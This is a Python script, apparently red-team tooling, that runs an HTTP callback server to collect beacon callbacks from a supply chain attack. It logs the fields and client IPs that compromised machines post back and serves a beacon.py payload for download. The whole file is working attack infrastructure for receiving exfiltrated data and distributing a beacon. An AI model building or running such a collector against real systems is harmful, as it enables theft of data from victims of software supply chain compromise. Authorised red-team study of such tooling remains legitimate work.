#!/usr/bin/env python3
"""
Simple Callback Server - receives beacon callbacks and logs them.
Run this on the Adaptix server to capture supply chain attack callbacks.
"""
import http.server
import socketserver
import urllib.parse
import json
from datetime import datetime

PORT = 9999
CALLBACKS = []

class CallbackHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/callback":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse the callback data
            data = dict(urllib.parse.parse_qsl(post_data))
            data['received_at'] = datetime.now().isoformat()
            data['client_ip'] = self.client_address[0]
            
            CALLBACKS.append(data)
            
            # Print to console with formatting
            print("\n" + "="*60)
            print("[+] BEACON CALLBACK RECEIVED!")
            print("="*60)
            for k, v in data.items():
                print(f"    {k}: {v}")
            print("="*60 + "\n")
            
            # Log to file
            with open("/tmp/callbacks.json", "a") as f:
                f.write(json.dumps(data) + "\n")
            
            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            # Serve files normally (for beacon.py download)
            super().do_GET()
    
    def do_GET(self):
        if self.path == "/status":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "callbacks": len(CALLBACKS),
                "recent": CALLBACKS[-5:] if CALLBACKS else []
            }).encode())
        else:
            super().do_GET()
    
    def log_message(self, format, *args):
        # Custom logging
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")

def main():
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║              RED TEAM - Callback Server                       ║
╠══════════════════════════════════════════════════════════════╣
║  Listening on port {PORT}                                       ║
║  Callback endpoint: http://0.0.0.0:{PORT}/callback              ║
║  Beacon download:   http://0.0.0.0:{PORT}/beacon.py             ║
║  Status:            http://0.0.0.0:{PORT}/status                ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    with socketserver.TCPServer(("", PORT), CallbackHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped")

if __name__ == "__main__":
    main()
